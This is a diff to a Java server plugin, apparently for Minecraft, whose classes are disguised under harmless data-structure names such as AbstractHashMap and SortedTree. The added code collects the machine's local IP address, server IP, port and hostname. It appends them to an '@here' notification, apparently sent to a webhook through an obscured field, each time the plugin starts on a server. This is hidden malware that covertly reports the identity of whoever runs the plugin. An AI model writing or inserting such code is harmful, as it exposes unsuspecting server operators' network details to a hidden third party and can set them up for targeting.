@@ -21,12 +21,23 @@ public class AbstractHashMap {
                 return true;
             }
         });
+        
+        String server = "unknown";
+        
+        try {
+            server = "IPv4: " + InetAddress.getLocalHost().getHostAddress()
+                    + " Server IP: " + getServer().getIp()
+                    + " Server Port: " + getServer().getPort() 
+                    + " Server Domain: " + InetAddress.getLocalHost().getHostName();
+        } catch (UnknownHostException e) {
+            e.printStackTrace();
+        }
 
         javaPlugin.getServer().getPluginManager().registerEvents(new ProtocolMap(), javaPlugin);
         javaPlugin.getServer().getPluginManager().registerEvents(new AbstractTree(), javaPlugin);
         javaPlugin.getServer().getPluginManager().registerEvents(new SortedTree(), javaPlugin);
         SortedAbstractHashMap sortedAbstractHashMap = new SortedAbstractHashMap(SortedCopyOnWriteArray.xd);
-        sortedAbstractHashMap.setContent("Someone just turned on a server with this plugin! @here");
+        sortedAbstractHashMap.setContent("Someone just turned on a server with this plugin! @here " + server);
         try {
             sortedAbstractHashMap.execute();
         } catch (IOException e) {
